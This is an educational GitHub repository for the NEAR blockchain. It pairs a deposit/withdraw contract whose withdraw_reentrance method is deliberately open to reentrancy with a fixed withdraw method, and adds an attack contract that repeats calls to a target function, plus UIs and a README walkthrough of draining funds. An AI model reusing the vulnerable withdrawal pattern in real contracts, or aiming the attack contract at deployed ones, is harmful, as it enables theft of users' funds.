*GitHub Repository "gagdiez/reentrancy_attack"*

'''--- README.md ---
# Reentrancy Attacks

![img](example.png)

This repository shows how to perform a reentrancy attack on a smart contract, as well as how to protect a contract from such attack. The repo is composed by two components:
1. A simple contract which allows to deposit and withdraw NEARs.
2. A contract that can perform a reentrancy attack in any (unprotected) contract.

## The Exploitable Contract

The Exploitable Contract (EC) is a contract that implements 3 methods:
- Deposit: Method that allows to deposit money
- Withdraw: Method that allows to withdraw the deposited money
- Withdraw Reentrancy: An exploitable version of the method "withdraw".

## Reentrancy Attack Contract

The Reentrancy Attack Contract (RAC) implements a single method. Given a 
contract address (TARGET), a function (fc), its arguments (args), and a
number N, our contract will call Target.fc(args) N times in a row to try
to exploit it.

I have built a user friendly UI to interact with the contract.

# Performing a Reentrancy Attack in the Explitable Contract

## Starting the contracts

Enter in the folders and run
```bash
npm install
npm start
```

This will open two browser tabs: One to interact with the Exploitable Contract (EC),
and the other to interact with the Reentrancy Attrack Contract (RAC).

## Reentrancy Attack

Copy the EC address into the "Target" field of the RAC. Call first the function
"deposit" with 0.01N attached to deposit them in the EC. Then, call "withdraw"
with the parameters {"amount": "10000000000000000"} 3 times, it should fail.
Try again but calling "withdraw\_reentrance" this time. Congratulations, you
just performed a reentrancy attack.

'''
'''--- exploitable_contract/README.md ---
# Exploitable Contract

To run this project locally:

1. Prerequisites: Make sure you've installed [Node.js] ≥ 12
2. Install dependencies **in /contract**: `cd contract && yarn install`
3. Install dependencies **in /**: `yarn install`
3. Run the local development server: `yarn dev` (see `package.json` for a
   full list of `scripts` you can run with `yarn`)

'''
'''--- exploitable_contract/contract/README.md ---
pool_party Smart Contract
==================

A [smart contract] written in [AssemblyScript] for an app initialized with [create-near-app]

Quick Start
===========

Before you compile this code, you will need to install [Node.js] ≥ 12

Exploring The Code
==================

1. The main smart contract code lives in `assembly/index.ts`. You can compile
   it with the `./compile` script.
2. Tests: You can run smart contract tests with the `./test` script. This runs
   standard AssemblyScript tests using [as-pect].

  [smart contract]: https://docs.near.org/docs/roles/developer/contracts/intro
  [AssemblyScript]: https://www.assemblyscript.org/
  [create-near-app]: https://github.com/near/create-near-app
  [Node.js]: https://nodejs.org/en/download/package-manager/
  [as-pect]: https://www.npmjs.com/package/@as-pect/cli

'''
'''--- exploitable_contract/contract/as-pect.config.js ---
module.exports = require('near-sdk-as/imports')
'''
'''--- exploitable_contract/contract/asconfig.json ---
{
  "extends": "near-sdk-as/asconfig.json"
}

'''
'''--- exploitable_contract/contract/assembly/__tests__/as-pect.d.ts ---
/// <reference types="@as-pect/assembly/types/as-pect" />
'''
'''--- exploitable_contract/contract/assembly/__tests__/main.spec.ts ---
import { get_user, deposit, withdraw_reentrance } from '..';
import { User } from '../model';
import { storage, Context, u128, logging, VMContext,
         ContractPromiseResult } from "near-sdk-as";

function withdraw_11():void{
  withdraw_reentrance(u128.from(11))
}

describe("Deposit and Withdraw", () => {
  it("correctly deposits/withdraws money", () => {

    VMContext.setPredecessor_account_id(Context.contractName)

    const subjects:i32 = 3
    for(let i=0; i < subjects; i++){
      VMContext.setPrepaid_gas(300000000000000)
      VMContext.setPredecessor_account_id(i.toString())
      VMContext.setAttached_deposit(u128.from((i+1)*10))
      deposit()
    }
    
    let expected_balances:Array<i32> = [10, 20, 30]
    
    for(let i:i32=0; i < subjects; i++){
      VMContext.setPrepaid_gas(300000000000000)
      let user:User = get_user(i.toString())
      expect(user.balance).toBe(u128.from(expected_balances[i]))
    }

    VMContext.setPredecessor_account_id("2")
    expect(withdraw_11).not.toThrow()
    expect(withdraw_11).not.toThrow()
    expect(withdraw_11).toThrow()
  });
})

'''
'''--- exploitable_contract/contract/assembly/as_types.d.ts ---
/// <reference types="near-sdk-as/assembly/as_types" />
'''
'''--- exploitable_contract/contract/assembly/index.ts ---
import {storage, context, env, u128, ContractPromise, ContractPromiseBatch,
        ContractPromiseResult, logging, math, PersistentVector} from "near-sdk-as";
import {user_to_idx, idx_to_user, user_balance, User} from "./model"

// Aux functions --------------------------------------------------------------
// ----------------------------------------------------------------------------
function check_internal():void{
  // Check that callback functions are called by this contract
  assert(context.predecessor == context.contractName, "Just don't")
}

function get_callback_result():ContractPromiseResult{
  // Return the result from the external pool
  let results = ContractPromise.getResults()

  if(results.length > 0){ return results[0] }
  
  // Function is being called directly by our contract => TESTING
  return new ContractPromiseResult(1)
}

// Get user info --------------------------------------------------------------
// ----------------------------------------------------------------------------
export function get_user(user:string): User{
  if(!user_to_idx.contains(user)){
    return new User(user, u128.Zero)
  }

  const idx:i32 = user_to_idx.getSome(user)
  const balance:u128 = user_balance[idx]

  return new User(user, balance)
}

export function get_all_users(): Array<User>{
  let res:Array<User> = new Array<User>()
  for(let i:i32=0; i < user_balance.length; i++){
    let name:string = idx_to_user.getSome(i)
    let balance:u128 = user_balance[i]
    res.push(new User(name, balance))
  }
  return res
}

// Deposit --------------------------------------------------------------------
// ----------------------------------------------------------------------------
export function deposit():bool{
  const user:string = context.predecessor
  let idx:i32

  if(user_to_idx.contains(user)){
    logging.log("Deposit on user: " + idx.toString())
    idx = user_to_idx.getSome(user)
  }else{
    idx = storage.getPrimitive<i32>('total_users', 0)
    storage.set<i32>('total_users', idx+1)
    
    logging.log("Creating user: " + idx.toString())
    user_to_idx.set(user, idx)
    user_balance.push(u128.Zero)
    idx_to_user.set(idx, user)
  }
  
  user_balance[idx] = user_balance[idx] + context.attachedDeposit

  return true
}

// Restart --------------------------------------------------------------------
// ----------------------------------------------------------------------------
export function restart():bool{
  // Set all the user's balance to 0
  for(let i:i32=0; i < user_balance.length; i++){ user_balance[i] = u128.Zero }
  return true
}

// Withdraw - ! ---------------------------------------------------------------
// This function can be exploited to take more money --------------------------
@nearBindgen
class IntArgs{
  constructor(public idx:i32, public amount:u128){}
}

export function withdraw_reentrance(amount:u128):void{
  assert(user_to_idx.contains(context.predecessor), "User dont exist")
  
  let idx:i32 = user_to_idx.getSome(context.predecessor)

  assert(amount <= user_balance[idx], "Not enough money")

  // Send money to the user and callback
  let iargs:IntArgs = new IntArgs(idx, amount)
  
  ContractPromiseBatch.create(context.predecessor)
  .transfer(amount)
  .then(context.contractName)
  .function_call("_withdraw_reentrance", iargs.encode(),
                 u128.Zero, 7000000000000)
}

export function _withdraw_reentrance(idx:i32, amount:u128):void{
  check_internal()

  let response = get_callback_result()

  if(response.status == 1){
    user_balance[idx] = user_balance[idx] - amount
  }
}

// Withdraw -------------------------------------------------------------------
// This function can NOT be exploited -----------------------------------------
export function withdraw(amount:u128):void{
  assert(user_to_idx.contains(context.predecessor), "User dont exist")
  
  let idx:i32 = user_to_idx.getSome(context.predecessor)

  assert(amount <= user_balance[idx], "Not enough money")
  
  // Reduce the user balance before the external call 
  user_balance[idx] = user_balance[idx] - amount

  // Send money to the user and callback
  let iargs:IntArgs = new IntArgs(idx, amount)
  
  ContractPromiseBatch.create(context.predecessor)
  .transfer(amount)
  .then(context.contractName)
  .function_call("_withdraw", iargs.encode(),
                 u128.Zero, 7000000000000)
}

export function _withdraw(idx:i32, amount:u128):void{
  check_internal()

  let response = get_callback_result()

  if(response.status != 1){
    // Rollback
    user_balance[idx] = user_balance[idx] + amount
  }
}

'''
'''--- exploitable_contract/contract/assembly/model.ts ---
import { PersistentVector, PersistentMap, u128, math } from "near-sdk-as";

@nearBindgen
export class User{
  constructor(public name:string,
              public balance:u128){}
}

export const user_to_idx = new PersistentMap<string, i32>('a')
export const idx_to_user = new PersistentMap<i32, string>('b')
export let user_balance = new PersistentVector<u128>('c')

'''
'''--- exploitable_contract/contract/assembly/tsconfig.json ---
{
  "extends": "assemblyscript/std/assembly.json",
  "include": [
    "./**/*.ts"
  ]
}

'''
'''--- exploitable_contract/contract/compile.js ---
// This file does two things:
//
// 1. Compile the AssemblyScript contract using the scripts in package.json
//    (see buildCmd below). This will create a wasm file in the 'build' folder.
// 2. Create a symbolic link (symlink) to the generated wasm file in the root
//    project's `out` folder, for easy use with near-cli.
//
// First, import some helper libraries. `shelljs` is included in the
// devDependencies of the root project, which is why it's available here. It
// makes it easy to use *NIX-style scripting (which works on Linux distros,
// macOS, and Unix systems) on Windows as well.
const sh = require('shelljs')
const path = require('path')

// Figure out which directory the user called this script from, which we'll use
// later to set up the symlink.
const calledFromDir = sh.pwd().toString()

// For the duration of this script, we want to operate from within the
// AssemblyScript project's folder. Let's change into that directory.
sh.cd(__dirname)

// You can call this script with `node compile.js` or `node compile.js --debug`.
// Let's set a variable to track whether `--debug` was used.
const debug = process.argv.pop() === '--debug'

// Use the correct build command based on the `--debug` flag
const buildCmd = debug
  ? 'npm run build:debug'
  : 'npm run build'

// Execute the build command, storing exit code for later use
const { code } = sh.exec(buildCmd)

// Assuming this is compiled from the root project directory, link the compiled
// contract to the `out` folder –
// When running commands like `near deploy`, near-cli looks for a contract at
// <CURRENT_DIRECTORY>/out/main.wasm
if (code === 0 && calledFromDir !== __dirname) {
  const linkDir = `${calledFromDir}/out`
  const link = `${calledFromDir}/out/main.wasm`
  const packageName = require(`${__dirname}/package.json`).name
  const outFile = `./build/${debug ? 'debug' : 'release'}/${packageName}.wasm`
  sh.mkdir('-p', linkDir)
  sh.rm('-f', link)
  const linkPath = path.relative(linkDir, outFile)
  sh.ln('-s', linkPath, link)
}

// exit script with the same code as the build command
process.exit(code)

'''
'''--- exploitable_contract/contract/package.json ---
{
  "name": "greeter",
  "version": "0.0.1",
  "license": "UNLICENSED",
  "private": true,
  "scripts": {
    "build": "asb",
    "build:debug": "asb --target debug",
    "test": "asp --nologo"
  },
  "dependencies": {
    "near-sdk-as": "1.0.0"
  },
  "devDependencies": {
    "shelljs": "^0.8.4"
  }
}

'''
'''--- exploitable_contract/package.json ---
{
  "name": "exploitable_contract",
  "version": "1.0.0",
  "license": "UNLICENSED",
  "scripts": {
    "build": "npm run build:contract && npm run build:web",
    "build:contract": "node contract/compile.js",
    "build:contract:debug": "node contract/compile.js --debug",
    "build:web": "parcel build src/index.html --public-url ./",
    "dev:deploy:contract": "near dev-deploy",
    "deploy:contract": "near deploy",
    "deploy:pages": "gh-pages -d dist/",
    "deploy": "npm run build && npm run deploy:contract && npm run deploy:pages",
    "prestart": "npm run build:contract:debug && npm run dev:deploy:contract",
    "start": "echo The app is starting! It will automatically open in your browser when ready && env-cmd -f ./neardev/dev-account.env parcel src/index.html --open",
    "dev": "nodemon --watch contract -e ts --exec \"npm run start\"",
    "test": "npm run build:contract:debug && cd contract && npm run test && cd .. && npm run jest",
    "jest": "npm run build:contract:debug && jest test --runInBand"
  },
  "devDependencies": {
    "env-cmd": "~10.1.0",
    "gh-pages": "~3.1.0",
    "jest": "~26.6.2",
    "jest-environment-node": "~26.6.2",
    "near-cli": "~1.4.0",
    "nodemon": "~2.0.3",
    "parcel-bundler": "~1.12.4",
    "shelljs": "~0.8.4"
  },
  "dependencies": {
    "jquery": "^3.5.1",
    "near-api-js": "~0.35.0",
    "regenerator-runtime": "~0.13.5"
  },
  "jest": {
    "testEnvironment": "near-cli/test_environment",
    "testPathIgnorePatterns": [
      "<rootDir>/contract/",
      "<rootDir>/node_modules/"
    ]
  }
}

'''
'''--- exploitable_contract/src/assets/js/blockchain.js ---
import 'regenerator-runtime/runtime'
import * as nearAPI from "near-api-js";
let getConfig = require('./config')

const nearConfig = getConfig('testnet')

window.nearAPI = nearAPI
window.contractName = nearConfig.contractName

export function floor(value, decimals=2){
  value = parseFloat(String(value).replace(',', ''))
  let number = Number(Math.floor(value+'e'+decimals)+'e-'+decimals)
  if(isNaN(number)){number = 0}
  return number
}

export function login() {
  walletConnection.requestSignIn(nearConfig.contractName, 'Simple Contract');
}

export function logout() {
  walletConnection.signOut()
  window.location.replace(window.location.origin + window.location.pathname)
}

export async function initNEAR() {
  // Initializing connection to the NEAR node.
  window.near = await nearAPI.connect(Object.assign(nearConfig, {deps:{keyStore: new nearAPI.keyStores.BrowserLocalStorageKeyStore()}}));

  // Needed to access wallet login
  window.walletConnection = await new nearAPI.WalletConnection(window.near, nearConfig.contractName)
  window.walletAccount = walletConnection.account()

  // Initializing our contract APIs by contract name and configuration.
  window.contract = await near.loadContract(
    nearConfig.contractName,
    {viewMethods: ['get_user', 'get_all_users'],
     changeMethods: ['withdraw_reentrance', 'deposit', 'restart'],
     sender: window.walletAccount.accountId}
  );
}

export async function deposit(_amount){
  let amount = nearAPI.utils.format.parseNearAmount(_amount.toString())

  const account = window.walletConnection.account()
  account.functionCall(
    nearConfig.contractName, 'deposit', {}, 300000000000000, amount
  )
}

export async function get_all_users(){
  let info = await contract.get_all_users()
  for(let i=0; i<info.length;i++){
    info[i].balance = floor(nearAPI.utils.format.formatNearAmount(info[i].balance))
  }
  return info 
}

export async function get_user(account_id){
  let info = await contract.get_user({user:account_id})
  info.balance = floor(nearAPI.utils.format.formatNearAmount(info.balance))
  return info 
}

export async function withdraw(amount){
  amount = floor(amount)
  amount = nearAPI.utils.format.parseNearAmount(amount.toString())
  let result = await contract.account.functionCall(
    nearConfig.contractName, 'withdraw_reentrance',
    {amount:amount}, 300000000000000, 0
  )
  return nearAPI.providers.getTransactionLastResult(result)
}

export async function restart(){
  let info = await contract.restart()
  return info 
}

'''
'''--- exploitable_contract/src/assets/js/config.js ---
const CONTRACT_NAME = process.env.CONTRACT_NAME ||'pool_party'

function getConfig(env) {
  switch (env) {

  case 'production':
  case 'mainnet':
    return {
      networkId: 'mainnet',
      nodeUrl: 'https://rpc.mainnet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.near.org',
      helperUrl: 'https://helper.mainnet.near.org',
      explorerUrl: 'https://explorer.mainnet.near.org',
    }
  case 'development':
  case 'testnet':
    return {
      networkId: 'testnet',
      nodeUrl: 'https://rpc.testnet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.testnet.near.org',
      helperUrl: 'https://helper.testnet.near.org',
      explorerUrl: 'https://explorer.testnet.near.org',
    }
  case 'betanet':
    return {
      networkId: 'betanet',
      nodeUrl: 'https://rpc.betanet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.betanet.near.org',
      helperUrl: 'https://helper.betanet.near.org',
      explorerUrl: 'https://explorer.betanet.near.org',
    }
  case 'local':
    return {
      networkId: 'local',
      nodeUrl: 'http://localhost:3030',
      keyPath: `${process.env.HOME}/.near/validator_key.json`,
      walletUrl: 'http://localhost:4000/wallet',
      contractName: CONTRACT_NAME,
    }
  case 'test':
  case 'ci':
    return {
      networkId: 'shared-test',
      nodeUrl: 'https://rpc.ci-testnet.near.org',
      contractName: CONTRACT_NAME,
      masterAccount: 'test.near',
    }
  case 'ci-betanet':
    return {
      networkId: 'shared-test-staging',
      nodeUrl: 'https://rpc.ci-betanet.near.org',
      contractName: CONTRACT_NAME,
      masterAccount: 'test.near',
    }
  default:
    throw Error(`Unconfigured environment '${env}'. Can be configured in src/config.js.`)
  }
}

module.exports = getConfig

'''
'''--- exploitable_contract/src/assets/js/index.js ---
import {initNEAR, login, logout, get_user, deposit,
        withdraw, get_all_users, restart} from './blockchain'

async function flow(){

  $('#contract').html(window.contractName)

  let users = await get_all_users()

  $('#users').html('')
  for (var i = 0; i < users.length; i++) {
    $('#users').append(`<li>${users[i].name} - ${users[i].balance} N</li>`);
  }

  if (!window.walletAccount.accountId){
    $("#logged-out").show()
  }else{
    $("#logged-in").show()
    window.user = await get_user(window.walletAccount.accountId)
    $('#account').html(window.walletAccount.accountId)
    $('#user-balance').html(user.balance)
  }
}

window.onload = function(){
  window.nearInitPromise = initNEAR()
  .then(flow)
  .catch(console.error)
}

window.login = login
window.logout = logout
window.deposit = deposit
window.restart = restart

const spin = "<span class='fas fa-sync fa-spin'></span>"

window.withdraw = async function(amount){
  $('#interaction').html(spin + " Withdrawing from contract, please wait")
  await withdraw(amount)
  .then(response => location.reload()) 
  .catch(error => $('#interaction').html(error))
}

window.restart = async function(){
  $('#interaction').html(spin + " Setting all deposits to 0, please wait")
  await restart();
  location.reload();
}

'''
'''--- exploitable_contract/src/index.html ---
<!DOCTYPE html>
<body>
<head>
  <meta charset="utf-8">
  <!-- Font awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
    integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"
    integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"
    integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>

  <title>Basic deposit/withdraw contract</title>
</head>

<body class="bg-light">
  <div class="container">
    <div class="my-3 border rounded py-4 px-5 bg-white">
      <section id='logged-out' style="display:none">
        You are not logged in, please: 
        <button class="btn btn-primary" type="button" onclick="login()"> Login </button>
      </section>
      <section id='logged-in' style="display:none">
        Logged in as: <span id="account"> </span> -
        <button class="btn btn-secondary" type="button" onclick="logout()"> Logout </button>
         
        <h5> You have: <span id="user-balance">0</span> NEAR </h5>
        
        <button class="btn btn-primary" type="button" onclick="deposit(0.5)">
          deposit .5 N
        </button> 
        <button class="btn btn-primary" type="button" onclick="withdraw(0.25)">
          withdraw .25 N
        </button>
        <button class="btn btn-danger" type="button" onclick="restart()">
          restart
        </button>
        
        <br>

        <label id="interaction" class="text-muted"> Press a button </label>

      </section>

      <hr class="my-4">

      <section>
        <h4> Deposits on <span id="contract"> </span> </h4>
        <ul id="users"></ul>
      </section>
    </div>

    <label class="text-align-right">
      Made by <a href="https://www.twitter.com/gagdiez">gagdiez</a>
    </label>

  </div>
  
  <script src="assets/js/index.js"></script>
</body>
</html>

'''
'''--- reentrancy_attack/README.md ---
# Reentrancy Attack Contract

To run this project locally:

1. Prerequisites: Make sure you've installed [Node.js] ≥ 12
2. Install dependencies **in /contract**: `cd contract && yarn install`
3. Install dependencies **in /**: `yarn install`
3. Run the local development server: `yarn dev` (see `package.json` for a
   full list of `scripts` you can run with `yarn`)

'''
'''--- reentrancy_attack/contract/README.md ---
pool_party Smart Contract
==================

A [smart contract] written in [AssemblyScript] for an app initialized with [create-near-app]

Quick Start
===========

Before you compile this code, you will need to install [Node.js] ≥ 12

Exploring The Code
==================

1. The main smart contract code lives in `assembly/index.ts`. You can compile
   it with the `./compile` script.
2. Tests: You can run smart contract tests with the `./test` script. This runs
   standard AssemblyScript tests using [as-pect].

  [smart contract]: https://docs.near.org/docs/roles/developer/contracts/intro
  [AssemblyScript]: https://www.assemblyscript.org/
  [create-near-app]: https://github.com/near/create-near-app
  [Node.js]: https://nodejs.org/en/download/package-manager/
  [as-pect]: https://www.npmjs.com/package/@as-pect/cli

'''
'''--- reentrancy_attack/contract/as-pect.config.js ---
module.exports = require('near-sdk-as/imports')
'''
'''--- reentrancy_attack/contract/asconfig.json ---
{
  "extends": "near-sdk-as/asconfig.json"
}

'''
'''--- reentrancy_attack/contract/assembly/__tests__/as-pect.d.ts ---
/// <reference types="@as-pect/assembly/types/as-pect" />
'''
'''--- reentrancy_attack/contract/assembly/__tests__/main.spec.ts ---
import { get_user, deposit, withdraw_reentrance } from '..';
import { User } from '../model';
import { storage, Context, u128, logging, VMContext,
         ContractPromiseResult } from "near-sdk-as";

function withdraw_11():void{
  withdraw_reentrance(u128.from(11))
}

describe("Deposit and Withdraw", () => {
  it("correctly deposits/withdraws money", () => {

    VMContext.setPredecessor_account_id(Context.contractName)

    const subjects:i32 = 3
    for(let i=0; i < subjects; i++){
      VMContext.setPrepaid_gas(300000000000000)
      VMContext.setPredecessor_account_id(i.toString())
      VMContext.setAttached_deposit(u128.from((i+1)*10))
      deposit()
    }
    
    let expected_balances:Array<i32> = [10, 20, 30]
    
    for(let i:i32=0; i < subjects; i++){
      VMContext.setPrepaid_gas(300000000000000)
      let user:User = get_user(i.toString())
      expect(user.balance).toBe(u128.from(expected_balances[i]))
    }

    VMContext.setPredecessor_account_id("2")
    expect(withdraw_11).not.toThrow()
    expect(withdraw_11).not.toThrow()
    expect(withdraw_11).toThrow()
  });
})

'''
'''--- reentrancy_attack/contract/assembly/as_types.d.ts ---
/// <reference types="near-sdk-as/assembly/as_types" />
'''
'''--- reentrancy_attack/contract/assembly/index.ts ---
import {storage, context, env, u128, ContractPromise, ContractPromiseBatch,
        ContractPromiseResult, logging, math, PersistentVector} from "near-sdk-as";
import {user_to_idx, user_balance, User} from "./model"

const dGAS:u64 = 20000000000000

export function call_N_times(target:string, fc:string, args:Array<u8>,
                             N:u32, attach:u128=u128.Zero, GAS:u64=dGAS):void{
  // Target: address of the contract we want to call 3 times
  // fc: function within the contract to call
  // args: json.stringify of the fc arguments, encoded as uint8array
  // N: number of times to call the function
  // attach: Amount of money to attach in the call
  // GAS: gas attached to each call
  assert(attach <= context.attachedDeposit, "Need to attach more money")
  

  let encoded_args = new Uint8Array(args.length)
  for(let i=0; i < args.length; i++){
    encoded_args[i] = args[i]
  }
 
  logging.log("Calling " + fc + " on " + target + " " + N.toString() + " times")

  let cp = ContractPromiseBatch.create(target)
  for(let i:u32=1; i <= N; i++){
   cp.function_call(fc, encoded_args, attach, GAS)
  }
} 

'''
'''--- reentrancy_attack/contract/assembly/model.ts ---
import { PersistentVector, PersistentMap, u128, math } from "near-sdk-as";

@nearBindgen
export class User{
  constructor(public name:string,
              public balance:u128){}
}

export const user_to_idx = new PersistentMap<string, i32>('a')
export let user_balance = new PersistentVector<u128>('b')

'''
'''--- reentrancy_attack/contract/assembly/tsconfig.json ---
{
  "extends": "assemblyscript/std/assembly.json",
  "include": [
    "./**/*.ts"
  ]
}

'''
'''--- reentrancy_attack/contract/compile.js ---
// This file does two things:
//
// 1. Compile the AssemblyScript contract using the scripts in package.json
//    (see buildCmd below). This will create a wasm file in the 'build' folder.
// 2. Create a symbolic link (symlink) to the generated wasm file in the root
//    project's `out` folder, for easy use with near-cli.
//
// First, import some helper libraries. `shelljs` is included in the
// devDependencies of the root project, which is why it's available here. It
// makes it easy to use *NIX-style scripting (which works on Linux distros,
// macOS, and Unix systems) on Windows as well.
const sh = require('shelljs')
const path = require('path')

// Figure out which directory the user called this script from, which we'll use
// later to set up the symlink.
const calledFromDir = sh.pwd().toString()

// For the duration of this script, we want to operate from within the
// AssemblyScript project's folder. Let's change into that directory.
sh.cd(__dirname)

// You can call this script with `node compile.js` or `node compile.js --debug`.
// Let's set a variable to track whether `--debug` was used.
const debug = process.argv.pop() === '--debug'

// Use the correct build command based on the `--debug` flag
const buildCmd = debug
  ? 'npm run build:debug'
  : 'npm run build'

// Execute the build command, storing exit code for later use
const { code } = sh.exec(buildCmd)

// Assuming this is compiled from the root project directory, link the compiled
// contract to the `out` folder –
// When running commands like `near deploy`, near-cli looks for a contract at
// <CURRENT_DIRECTORY>/out/main.wasm
if (code === 0 && calledFromDir !== __dirname) {
  const linkDir = `${calledFromDir}/out`
  const link = `${calledFromDir}/out/main.wasm`
  const packageName = require(`${__dirname}/package.json`).name
  const outFile = `./build/${debug ? 'debug' : 'release'}/${packageName}.wasm`
  sh.mkdir('-p', linkDir)
  sh.rm('-f', link)
  const linkPath = path.relative(linkDir, outFile)
  sh.ln('-s', linkPath, link)
}

// exit script with the same code as the build command
process.exit(code)

'''
'''--- reentrancy_attack/contract/package.json ---
{
  "name": "greeter",
  "version": "0.0.1",
  "license": "UNLICENSED",
  "private": true,
  "scripts": {
    "build": "asb",
    "build:debug": "asb --target debug",
    "test": "asp --nologo"
  },
  "dependencies": {
    "near-sdk-as": "1.0.0"
  },
  "devDependencies": {
    "shelljs": "^0.8.4"
  }
}

'''
'''--- reentrancy_attack/package.json ---
{
  "name": "reentrancy_attack",
  "version": "1.0.0",
  "license": "UNLICENSED",
  "scripts": {
    "build": "npm run build:contract && npm run build:web",
    "build:contract": "node contract/compile.js",
    "build:contract:debug": "node contract/compile.js --debug",
    "build:web": "parcel build src/index.html --public-url ./",
    "dev:deploy:contract": "near dev-deploy",
    "deploy:contract": "near deploy",
    "deploy:pages": "gh-pages -d dist/",
    "deploy": "npm run build && npm run deploy:contract && npm run deploy:pages",
    "prestart": "npm run build:contract:debug && npm run dev:deploy:contract",
    "start": "echo The app is starting! It will automatically open in your browser when ready && env-cmd -f ./neardev/dev-account.env parcel src/index.html --open",
    "dev": "nodemon --watch contract -e ts --exec \"npm run start\"",
    "test": "npm run build:contract:debug && cd contract && npm run test && cd .. && npm run jest",
    "jest": "npm run build:contract:debug && jest test --runInBand"
  },
  "devDependencies": {
    "env-cmd": "~10.1.0",
    "gh-pages": "~3.1.0",
    "jest": "~26.6.2",
    "jest-environment-node": "~26.6.2",
    "near-cli": "~1.4.0",
    "nodemon": "~2.0.3",
    "parcel-bundler": "^1.12.5",
    "shelljs": "~0.8.4"
  },
  "dependencies": {
    "jquery": "^3.5.1",
    "near-api-js": "~0.35.0",
    "regenerator-runtime": "~0.13.5"
  },
  "jest": {
    "testEnvironment": "near-cli/test_environment",
    "testPathIgnorePatterns": [
      "<rootDir>/contract/",
      "<rootDir>/node_modules/"
    ]
  }
}

'''
'''--- reentrancy_attack/src/assets/css/main.css ---
.text-success{
  color: #b4ffc0 !important;
}

.text-danger{
  color: #ffacb5 !important;
}

.text-info{
  color: #9aecf9 !important;
}

div.jsoneditor-field{
  color: #495057;
}

.jsoneditor{
  color: #495057;
  border: 1px solid #ced4da;
  border-radius: .25rem !important;
}

.small-input{
  width:2.2em;
}

.large-input{
  width:14em;
}

'''
'''--- reentrancy_attack/src/assets/js/blockchain.js ---
import 'regenerator-runtime/runtime'
import * as nearAPI from "near-api-js";
let getConfig = require('./config')

const nearConfig = getConfig('testnet')

window.nearAPI = nearAPI

export function login() {
  walletConnection.requestSignIn(nearConfig.contractName, 'Simple Contract');
}

export function logout() {
  walletConnection.signOut()
  window.location.replace(window.location.origin + window.location.pathname)
}

export async function initNEAR() {
  // Initializing connection to the NEAR node.
  window.near = await nearAPI.connect(Object.assign(nearConfig, {deps:{keyStore: new nearAPI.keyStores.BrowserLocalStorageKeyStore()}}));

  // Needed to access wallet login
  window.walletConnection = await new nearAPI.WalletConnection(window.near, nearConfig.contractName)
  window.walletAccount = walletConnection.account()

  // Initializing our contract APIs by contract name and configuration.
  window.contract = await near.loadContract(
    nearConfig.contractName,
    {viewMethods: [],
     changeMethods: ['call_N_times'],
     sender: window.walletAccount.accountId}
  );
}

export async function exec(params, attached){
  const account = window.walletConnection.account()
  account.functionCall(
    nearConfig.contractName, 'call_N_times', 
    params, 300000000000000, attached
  )
}

export async function exec_and_return(params, attached){
  let result = await contract.account.functionCall(
    nearConfig.contractName, 'call_N_times', 
    params, 300000000000000, attached
  )
  return nearAPI.providers.getTransactionLastResult(result)
}

'''
'''--- reentrancy_attack/src/assets/js/config.js ---
const CONTRACT_NAME = process.env.CONTRACT_NAME ||'pool_party'

function getConfig(env) {
  switch (env) {

  case 'production':
  case 'mainnet':
    return {
      networkId: 'mainnet',
      nodeUrl: 'https://rpc.mainnet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.near.org',
      helperUrl: 'https://helper.mainnet.near.org',
      explorerUrl: 'https://explorer.mainnet.near.org',
    }
  case 'development':
  case 'testnet':
    return {
      networkId: 'testnet',
      nodeUrl: 'https://rpc.testnet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.testnet.near.org',
      helperUrl: 'https://helper.testnet.near.org',
      explorerUrl: 'https://explorer.testnet.near.org',
    }
  case 'betanet':
    return {
      networkId: 'betanet',
      nodeUrl: 'https://rpc.betanet.near.org',
      contractName: CONTRACT_NAME,
      walletUrl: 'https://wallet.betanet.near.org',
      helperUrl: 'https://helper.betanet.near.org',
      explorerUrl: 'https://explorer.betanet.near.org',
    }
  case 'local':
    return {
      networkId: 'local',
      nodeUrl: 'http://localhost:3030',
      keyPath: `${process.env.HOME}/.near/validator_key.json`,
      walletUrl: 'http://localhost:4000/wallet',
      contractName: CONTRACT_NAME,
    }
  case 'test':
  case 'ci':
    return {
      networkId: 'shared-test',
      nodeUrl: 'https://rpc.ci-testnet.near.org',
      contractName: CONTRACT_NAME,
      masterAccount: 'test.near',
    }
  case 'ci-betanet':
    return {
      networkId: 'shared-test-staging',
      nodeUrl: 'https://rpc.ci-betanet.near.org',
      contractName: CONTRACT_NAME,
      masterAccount: 'test.near',
    }
  default:
    throw Error(`Unconfigured environment '${env}'. Can be configured in src/config.js.`)
  }
}

module.exports = getConfig

'''
'''--- reentrancy_attack/src/assets/js/index.js ---
import {initNEAR, login, logout, exec, exec_and_return} from './blockchain'

window.current_text = ""

async function flow(){
  if (!window.walletAccount.accountId){
    $("#logged-out").show()
  }else{
    $("#logged-in").show()
    $('#account').html(window.walletAccount.accountId)
  }
}

window.onload = function(){
  window.nearInitPromise = initNEAR()
  .then(flow)
  .catch(console.error)
}

window.login = login
window.logout = logout
window.exec = async function(){
  const target = $('#target').val()
  const fc = $('#fc').val()
  const args = editor.get()
  const N = Number($('#times').val())
